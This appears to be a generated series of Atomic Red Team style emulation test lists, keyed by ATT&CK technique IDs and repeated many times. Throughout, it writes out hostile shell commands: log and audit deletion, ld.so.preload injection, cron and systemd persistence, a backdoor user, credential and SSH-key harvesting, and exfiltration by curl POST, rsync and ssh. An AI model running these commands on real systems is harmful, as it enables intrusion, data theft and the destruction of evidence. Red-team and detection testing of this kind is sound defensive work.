sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1158 ,T1153 ,T1139 ,T1201 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1158 ,T1153 ,T1139 ,T1217 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1501 ,T1154 ,T1081 ,T1217 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1501 ,T1154 ,T1145 ,T1217 ,T1070 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1158 ,T1064 ,T1040 ,T1135 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1168 ,T1064 ,T1081 ,T1057 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1064 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1136 ,T1064 ,T1139 ,T1083 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1215 ,T1153 ,T1081 ,T1033 ,T1036 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

Test list contains:T0003 ,T1206 ,T1136 ,T1154 ,T1081 ,T1135 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1153 ,T1081 ,T1217 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1501 ,T1154 ,T1040 ,T1217 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1136 ,T1154 ,T1081 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1168 ,T1154 ,T1139 ,T1201 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1169 ,T1158 ,T1153 ,T1145 ,T1033 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
